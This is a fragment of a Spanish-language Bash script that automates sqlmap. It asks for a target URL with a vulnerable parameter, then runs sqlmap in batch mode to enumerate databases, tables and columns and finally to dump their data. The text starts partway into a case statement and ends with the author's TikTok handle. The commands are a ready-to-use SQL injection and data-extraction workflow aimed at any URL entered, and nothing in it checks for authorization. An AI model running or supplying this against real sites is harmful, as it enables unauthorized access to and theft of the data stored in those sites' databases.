echo "====================================="
echo "        SQLMAP AUTOMATIZADO"
echo "====================================="
echo "Autor del script: Alejandro Doral"
echo "Fecha del script: 11/11/2024"
echo "====================================="

    read -p "Dime la URL del objetivo con el parámetro vulnerable (ejemplo: http://example.com/vulnerable.php?id=1) ---> " url

    echo "Ejecutando SQLmap para enumerar bases de datos..."
    sudo sqlmap -u $url --dbs --forms --batch

    echo "Ejecutando SQLmap para enumerar tablas..."
    sudo sqlmap -u $url --tables --forms --batch

    echo "Ejecutando SQLmap para enumerar columnas..."
    sudo sqlmap -u $url --columns --forms --batch

    echo "Ejecutando SQLmap para volcar los datos..."
    sudo sqlmap -u $url --dump --forms --batch

    echo ""
    echo "Proceso de SQLmap completado."
    ;;
*)
    echo "Opción no válida."
    ;;
esac

echo ""
echo "====================================="
echo "Gracias por usar mi script!!"
echo "Sigueme en mi tiktok ---> @darkseason_gd"
echo "====================================="

